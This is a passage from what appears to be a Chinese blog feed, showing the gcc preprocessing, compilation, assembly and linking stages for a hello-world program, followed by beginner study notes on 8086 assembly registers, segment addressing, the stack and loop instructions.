class="hljs-title function_">ungetc</span> <span class="hljs-params">(<span class="hljs-type">int</span> __c, FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">2</span>)))</span>;<br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">fread</span> <span class="hljs-params">(<span class="hljs-type">void</span> *__restrict __ptr, <span class="hljs-type">size_t</span> __size,</span><br><span class="hljs-params">       <span class="hljs-type">size_t</span> __n, FILE *__restrict __stream)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">4</span>)))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">fwrite</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *__restrict __ptr, <span class="hljs-type">size_t</span> __size,</span><br><span class="hljs-params">        <span class="hljs-type">size_t</span> __n, FILE *__restrict __s)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">4</span>)))</span>;<br># <span class="hljs-number">766</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">fread_unlocked</span> <span class="hljs-params">(<span class="hljs-type">void</span> *__restrict __ptr, <span class="hljs-type">size_t</span> __size,</span><br><span class="hljs-params">         <span class="hljs-type">size_t</span> __n, FILE *__restrict __stream)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">4</span>)))</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">size_t</span> <span class="hljs-title function_">fwrite_unlocked</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *__restrict __ptr, <span class="hljs-type">size_t</span> __size,</span><br><span class="hljs-params">          <span class="hljs-type">size_t</span> __n, FILE *__restrict __stream)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">4</span>)))</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fseek</span> <span class="hljs-params">(FILE *__stream, <span class="hljs-type">long</span> <span class="hljs-type">int</span> __off, <span class="hljs-type">int</span> __whence)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ftell</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">rewind</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br># <span class="hljs-number">803</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fseeko</span> <span class="hljs-params">(FILE *__stream, <span class="hljs-type">__off_t</span> __off, <span class="hljs-type">int</span> __whence)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">__off_t</span> <span class="hljs-title function_">ftello</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br># <span class="hljs-number">829</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fgetpos</span> <span class="hljs-params">(FILE *__restrict __stream, <span class="hljs-type">fpos_t</span> *__restrict __pos)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fsetpos</span> <span class="hljs-params">(FILE *__stream, <span class="hljs-type">const</span> <span class="hljs-type">fpos_t</span> *__pos)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br># <span class="hljs-number">860</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">clearerr</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">feof</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ferror</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">clearerr_unlocked</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">feof_unlocked</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ferror_unlocked</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">perror</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__s)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__cold__))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fileno</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">fileno_unlocked</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br># <span class="hljs-number">897</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">pclose</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><br><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-title function_">popen</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *__command, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *__modes)</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__malloc__ (pclose, <span class="hljs-number">1</span>)))</span> ;<br><br><br><br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">ctermid</span> <span class="hljs-params">(<span class="hljs-type">char</span> *__s)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span><br>  __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__access__ (__write_only__, <span class="hljs-number">1</span>)))</span>;<br># <span class="hljs-number">941</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">flockfile</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> <span class="hljs-title function_">ftrylockfile</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">funlockfile</span> <span class="hljs-params">(FILE *__stream)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nothrow__ , __leaf__))</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((__nonnull__ (<span class="hljs-number">1</span>)))</span>;<br># <span class="hljs-number">959</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> __uflow (FILE *);<br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> __overflow (FILE *, <span class="hljs-type">int</span>);<br># <span class="hljs-number">983</span> <span class="hljs-string">&quot;/usr/include/stdio.h&quot;</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><br># <span class="hljs-number">2</span> <span class="hljs-string">&quot;hello.c&quot;</span> <span class="hljs-number">2</span><br><br><br># <span class="hljs-number">3</span> <span class="hljs-string">&quot;hello.c&quot;</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello,world\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="编译阶段-1"><a href="#编译阶段-1" class="headerlink" title="编译阶段"></a>编译阶段</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/test$ gcc -S hello.c -o hello.s<br></code></pre></td></tr></table></figure><p>添加-S选项操作对象可以是源码hello.c,也可以是hello.i</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/test$ gcc -S hello.i -o hello.s -masm=intel -fno-asynchronous-unwind-tables<br></code></pre></td></tr></table></figure><p>添加编译选项-masm&#x3D;intel，指定生成为我们熟悉的intel格式，-fno-asynchronous-unwind-tables,生成没有cfi宏的汇编指令，提高代码可读性</p><p><strong>hello.s</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">        .file   &quot;hello.c&quot;<br>        .intel_syntax noprefix<br>        .text<br>        .section        .rodata<br>.LC0:<br>        .string &quot;hello,world&quot;<br>        .text<br>        .globl  main<br>        .type   main, @function<br>main:<br>        endbr64<br>        push    rbp<br>        mov     rbp, rsp<br>        lea     rax, .LC0[rip]<br>        mov     rdi, rax<br>        call    puts@PLT<br>        mov     eax, 0<br>        pop     rbp<br>        ret<br>        .size   main, .-main<br>        .ident  &quot;GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0&quot;<br>        .section        .note.GNU-stack,&quot;&quot;,@progbits<br>        .section        .note.gnu.property,&quot;a&quot;<br>        .align 8<br>        .long   1f - 0f<br>        .long   4f - 1f<br>        .long   5<br>0:<br>        .string &quot;GNU&quot;<br>1:<br>        .align 8<br>        .long   0xc0000002<br>        .long   3f - 2f<br>2:<br>        .long   0x3<br>3:<br>        .align 8<br>4:<br></code></pre></td></tr></table></figure><p>可以看到printf()被改成了puts，这是因为当printf()只有单一参数时，与puts类似，GCC的优化策略就将其替换以提高性能</p><h4 id="汇编阶段-1"><a href="#汇编阶段-1" class="headerlink" title="汇编阶段"></a>汇编阶段</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/test$ gcc -c hello.s -o hello.o<br></code></pre></td></tr></table></figure><p>生成目标文件 hello.o 一个可重定位文件，用objdump查看其内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/test$ objdump -sd hello.o -M intel<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs assembly"><br>hello.o:     file format elf64-x86-64<br><br>Contents of section .text:<br> 0000 f30f1efa 554889e5 488d0500 00000048  ....UH..H......H<br> 0010 89c7e800 000000b8 00000000 5dc3      ............].<br>Contents of section .rodata:<br> 0000 68656c6c 6f2c776f 726c6400           hello,world.<br>Contents of section .comment:<br> 0000 00474343 3a202855 62756e74 75203133  .GCC: (Ubuntu 13<br> 0010 2e332e30 2d367562 756e7475 327e3234  .3.0-6ubuntu2~24<br> 0020 2e303429 2031332e 332e3000           .04) 13.3.0.<br>Contents of section .note.gnu.property:<br> 0000 04000000 10000000 05000000 474e5500  ............GNU.<br> 0010 020000c0 04000000 03000000 00000000  ................<br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;main&gt;:<br>   0:   f3 0f 1e fa             endbr64<br>   4:   55                      push   rbp<br>   5:   48 89 e5                mov    rbp,rsp<br>   8:   48 8d 05 00 00 00 00    lea    rax,[rip+0x0]        # f &lt;main+0xf&gt;<br>   f:   48 89 c7                mov    rdi,rax<br>  12:   e8 00 00 00 00          call   17 &lt;main+0x17&gt;<br>  17:   b8 00 00 00 00          mov    eax,0x0<br>  1c:   5d                      pop    rbp<br>  1d:   c3                      ret<br></code></pre></td></tr></table></figure><p>由于此时未链接，对象文件中符号的虚拟地址无法确定</p><h4 id="链接阶段-1"><a href="#链接阶段-1" class="headerlink" title="链接阶段"></a>链接阶段</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/test$ gcc hello.o -o hello -static<br></code></pre></td></tr></table></figure><p>这样我们就得到了一个静态可执行文件，其中含有较多的库文件，所以就不展示，感兴趣使用objump查看即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/scr1w/test$ objdump -sd hello -M intel<br></code></pre></td></tr></table></figure><p>此时的符号地址已经修改为实际的地址了</p>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>blog_learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言</title>
    <link href="/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80(%E7%8E%8B%E7%88%BD)%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <url>/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80(%E7%8E%8B%E7%88%BD)%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​本文档为大连理工大学软件学院24级Briteny所总结编写，内容基于汇编语言（王爽）的第四版，加入个人理解和总结，如有问题，欢迎及时指正。</p><p>​由于书的缘故，本文档内容可能和现在的设备相差较大，但对于入门学者，可以初步奠定对计算机的汇编语言以及相关的基本结构逻辑的认识，这个速通版还是可以读一读，毕竟虽然有点过时，但是毕竟计算机系统结构没有大改，所以基础的逻辑没变，所以我认为本书还是值得看一看。</p><p>​另外本书介绍了debug的使用，但本菜鸡只是略看一下，没有太多认识，且该debug对于二进制网络安全方向学习并不是很便利，所以不建议学习，其实我在电脑上系统更新把这个程序优化掉了。如果想要学习，请安装DOS并在CSDN上查询教程安装，在此我便不误人子弟了。</p><p><strong>阅读建议</strong>：</p><p>全篇读完后可以尝试看看书上的思考题，来确保自己正真掌握了这些相关的知识</p><p>[TOC]</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>汇编语言的指令组成：</p><p>1.汇编指令：机器码的助记符，有对应的机械码。</p><p>2.伪指令：没有对应的机械码，由编译器执行，计算机并不运行。</p><p>3.其他符号：如+，-，*，&#x2F;等，由编译器识别，没有对应的机械码。</p><p>存储器（内存）：指令和数据在存储器中存放。</p><p>指令和数据：在内存或磁盘上，数据和命令没有区别，都是二进制信息。</p><p>存储单元：</p><p>电子计算机的最小信息单位是bit，也就是一个二进制位。</p><p>微型机存储器的存储单元可以存储一个byte，即八个bit。</p><p>一个存储器有128个存储单元，也就是128字节。</p><p>CPU对存储器的读写：</p><p>CPU进行读写的要求：1.存储单元的地址（地址信息），2.器件的选择，读或写得命令（控制信息），3.读或写的数据（数据信息）。</p><p>示例如下：[CPU从三号单元读取数据]</p><p><img src="/../00000000/1.jpg"></p><p>过程：先地址线过程，再控制线过程，随后数据线过程。</p><p>总线：地址总线，控制总线，数据总线。</p><p>地址总线：导线可以传输的稳定状态只有两种，高电平或低电平。用二进制表示就是1和0.</p><p>CPU的寻址能力就是2的N次方（N是地址线个数）。</p><p>数据总线：8088CPU的数据总线宽度为8，一次只能传输一个字节；8086CPU的数据总线宽度为16，一次可以传输两个字节.</p><p>示例：两种CPU传输89D8H</p><p><img src="/../00000000/2.jpg"></p><p><img src="/./00000000/3.jpg"></p><p>控制总线：有多少根控制总线，就意味着CPU对外界有多少中控制。</p><p>主板：主板上有核心器件和一些主要器具，他们通过总线相连。</p><p>接卡口：CPU对外部设备是无法直接控制的，直接控制这些外部设备的是接卡口，CPU通过直接控制接卡口来间接控制外部设备。</p><p>各类存储芯片：随机存储器（RAM）和只读存储器（ROM）。</p><p>RAM：可读可写，但必须带电存储。</p><p>ROM：只可读取不可写入，关机后不丢失。</p><p>根据功能和连接方式又可分为：</p><p>随机存储器：存放CPU的绝大部分数据，主存储器一般由两个位置上的RAM组成——装在主板上的RAM和装在接卡口的RAM。</p><p>装有BIOS(基本输入输出系统)的ROM</p><p>接卡口上的RAM：对大批量的输入输出数据暂时存储</p><p>内存地址空间:</p><p>CPU将系统内的各类存储器看作逻辑存储器：</p><p><img src="/../00000000/4.jpg"></p><h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><p>寄存器是CPU的主要部件，进行数据的存储。</p><p>通用寄存器：AX,BX,CX,DX这四个用来存放一般性的数据，称为通用寄存器。</p><p>[8086CPU上一代寄存器都是8位的，8086CPU寄存器16位，可分为两个八位可独立的八位寄存器使用分为H，L]</p><p>两个字节成为一个字。</p><p>几条简单的汇编指令：[在写汇编指令时不需要区分大小写]</p><p>mov ax,18  将18传入ax寄存器中</p><p>add ax,bx 等效于ax&#x3D;ax+bx</p><p>物理地址：存储空间本质上是一个一维的线性空间，每一个内存地址在这个空间中都有唯一的地址，这个地址就是物理地址。</p><p>16位的CPU：一次性可以处理16位的数据，寄存器的宽度为16位；寄存器和运算器的通路为16位。</p><p>8086CPU给出物理地址的方法：采取两个16位地址合成一个20位地址，通过地址加法器得到物理地址。</p><p>地址加法器运算：物理地址&#x3D;段地址*16+偏移地址。</p><p>段：内存并没有分段，只是CPU分段了（段的最大长度为64KB由偏移地址的最大值决定）</p><p>例如：地址10000H~100FFH的内存地址组成一个段，这个段的起始基址为10000H，段地址为1000H，大小为100H；</p><p>[段地址*16是一定是16的倍数，所以一个段的起始地址必然是16的倍数，这就是段地址如上表示的原因]</p><p>段寄存器：8086CPU中有四个段寄存器CS,DS,SS,ES。CPU要访问内存时由这四个段寄存器提供内存单元段地址。</p><p>CS,IP指示了当前要读取<strong>命令</strong>的地址</p><p>CS：代码段寄存器，(段地址)</p><p>IP：指令指针寄存器，(偏移地址)</p><p>CS,IP指令的修改：简单的mov指令并不能修改CS,IP。此时需要用到jmp</p><p>jmp的用法：jmp  段地址：偏移地址   意为修改CS,IP为相应的段地址；</p><p>​      jmp  ax  (ax代指合法寄存器) 意思为修改IP为ax中的值。</p><p>代码段：可以在内存单元中定义一个段，用于存放代码。</p><h1 id="寄存器（内存访问）"><a href="#寄存器（内存访问）" class="headerlink" title="寄存器（内存访问）"></a>寄存器（内存访问）</h1><p>字单元：即存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成。</p><p>用16位来寄存一个字。高八位放高位字节，低八位放低位字节。</p><p>DS和[address]:</p><p>DS:8086CPU中有一个DS寄存器，<strong>通常用于存放要访问的数据的段地址</strong>。[注意看向ds中放入数据的方式]</p><p>示例：</p><p>mov bx 1000H</p><p>mov ds bx </p><p>mov al [0]</p><p>此时的[0]中的0就是内存单元的偏移地址，执行命令时，8086CPU会<strong>自动读取</strong>段地址。</p><p>字的传送：</p><p>由于8086CPU的16位结构，所以只需要在mov指令中给出16位寄存器就可以进行16位数据的传送了</p><p>mov,add ,sub指令：</p><p>mov    寄存器，数据</p><p>mov    寄存器，寄存器</p><p>mov    寄存器，内存单元</p><p>mov    段寄存器，寄存器</p><p>sub,add指令用法基本相同，一个代表加，一个代表减。</p><p>数据段：编程时根据需要，将一组内存单元定义为一个段专门存储数据。</p><p>栈：栈是一种具有独特访问方式的存储空间，特殊性就在于最后进入这个空间的数据最先出去（LIFO）</p><p>由于这种独特的存储方式，与正常的其他存储不同，在栈中，先放入栈的数据地址是高地址，而读取时则是读取低地址。</p><p>CPU提供的栈机制：</p><p>8086CPU提供基础的出栈(pop),入栈(push)指令。</p><p>SS,SP：任何时刻，SS:SP指向栈顶地址</p><p>push 指令按图示完成</p><p><img src="/../00000000/5.jpg"></p><p><strong>pop指令则刚好相反：</strong></p><p><img src="/../00000000/6.jpg"></p><p>栈顶超界问题：</p><p>栈满或栈空状态下执行pop,push指令很容易导致栈顶超界。</p><p>8086CPU不保证我们对栈的操作不会超界，也就是说，8086CPU只知道栈顶在哪，而不知道我们安排的栈空间有多大。</p><p>栈段：将一组内存单元定义为一个段，将其作为栈来使用，从而定义了一个栈段。</p><h1 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h1><p>源程序从写出到执行的过程：</p><p>1.用汇编语言编写源程序。</p><p>2.对源程序进行编译连接。</p><p>3.执行可执行文件中的程序。</p><p><img src="/../00000000/7.jpg"></p><p>1.伪指令：</p><p> segment 段开始</p><p>ends  段结束</p><p>成对使用，功能是定义一个段。</p><p>end  一个汇编程序结束的标志。(注意区分end和ends)</p><p>assume  不一定要深入了解，其作用就是将有特定相关用途的段和相关的段寄存器关联起来。</p><p>2.汇编语言编写的源程序，包括伪指令和汇编指令。</p><p>源文件中的所有内容称为源程序，将源程序中最终由计算机执行，处理的指令或者数据，称为程序。</p><p>3.标号：例如codesg这种不是汇编指令，不是伪指令。一个标号代表了一个地址。</p><p>例如：codesg 在segment前面作为一个段的名称，这个段的名称最后编译，连接程序处理为一个段的地址。</p><p>此处我们不用理会int 21H 的指令含义   只需要知道在程序的末尾加上这两条指令就可以实现程序的返回。</p><p>程序过程：</p><p>1.编辑源程序——利用任意文本编辑器编辑源程序，最终存储为纯文本文件即可(后缀.asm)</p><p>2.进入DOS方式用汇编编译器编译源程序，生成(后缀.obj)的目标文件[在此过程中编译程序可能会提示你输入交叉引用文件的名称，按enter键跳过即可]</p><p>目标文件是含有机械代码的目标文件。</p><p>3.连接：运行连接器[一个程序]然后输入需要链接的程序的名称和编译相同可能会出现映像文件的生成，同样跳过即可。</p><p>另外如果程序中调用了某个库的子程序，也需要将这个库和函数连接起来[写过C语言的都清楚，就类似于#include&lt;stdio.h&gt;]</p><p><em><strong>问题：谁将可执行文件中的程序载入内存并使它运行？</strong></em></p><p>对DOS有了解就知道，DOS程序中有个程序叫command.com</p><p><img src="/../00000000/8.jpg"></p><h1 id="BX和loop指令"><a href="#BX和loop指令" class="headerlink" title="BX和loop指令"></a>BX和loop指令</h1><p>[BX]是一个内存单元，它的偏移地址在bx中。</p><p>示例:    mov  al  [bx]  </p><p>示例含义：将一个内存单元送入al中，这个内存单元长度为一个字节（字节单元），这个内存的段地址在ds中，偏移地址在[bx]中。</p><p>由此可见[bx]的效果和[0]类似。</p><p>为简洁表述，我们用(ax)表示ax寄存器中的内容。</p><p>()中的元素一般有三种类型：1.寄存器名，2.段寄存器名，3.内存单元的物理地址</p><p>()所表示的数据类型一般为：1.字节，2.字</p><p>约定idata 用于表示常量    […]中的…其实就是一个常量。</p><p>示例：</p><p>mov ax,[bx]</p><p>功能：将当前ds:bx中存储的数据放入ax中。用表达式表示就是（ax）&#x3D;((ds)*16+(bx))</p><p>inc bx 的含义是bx中的内容+1 </p><p>尝试分析下面汇编语言的代码：{书本p97-p99有详细解读，如若不懂可以借阅查看}</p><p><img src="/../00000000/9.jpg"></p><p>loop指令：</p><p>格式：loop  标号</p><p>CPU对loop指令的处理方式为1.(cx)&#x3D;(cx)-1    2.判断cx中的值，不为零则转移到标号处进行执行程序，为零则向下执行</p><p>我们通常用loop实现循环，cx中存放着循环的次数</p><p>示例代码：目标实现123*236的计算</p><p>assume cs:code</p><p>code segment</p><p>​mov ax,0</p><p>​mov cx,236</p><p>​    s: add  ax,123</p><p>​loop s</p><p>​mov ax 4c00h</p><p>​int 21h</p><p>code ends </p><p>end</p><p>小问题：你能尝试改进算法吗？</p><p>loop与[bx]的联合使用：此部分较简单理解，仅给出示例，自己分析</p><p>程序目的：实现ffff:0~ffff:b中的8位数据累加到的dx寄存器中</p><p><img src="/../00000000/10.jpg"></p><p>段前缀：在先前的代码中可以见到明显的标识，如上面示例中的s 。在汇编语言中，用于显式地明显内存单元的段地址的符号[“ds:  ,cs:  ,ss:  ,es:  “]在汇编语言中称为段前缀。</p><p>在8086模式中，我们随意向内存中写入一段代码是非常危险的，因为这段内存可能原来存放着重要的系统数据或代码。所以我们写入的部位最好是空白的，或者没有程序的数据或者代码的。在DOS模式下，一般 0：200~2ff   空间中没有系统或其他程序的代码和数据，所以可以用这段空间写入代码（书本原话，但不建议练习，毕竟8086模式不一定与你的设备相同匹配）</p><h1 id="包含多个段的程序"><a href="#包含多个段的程序" class="headerlink" 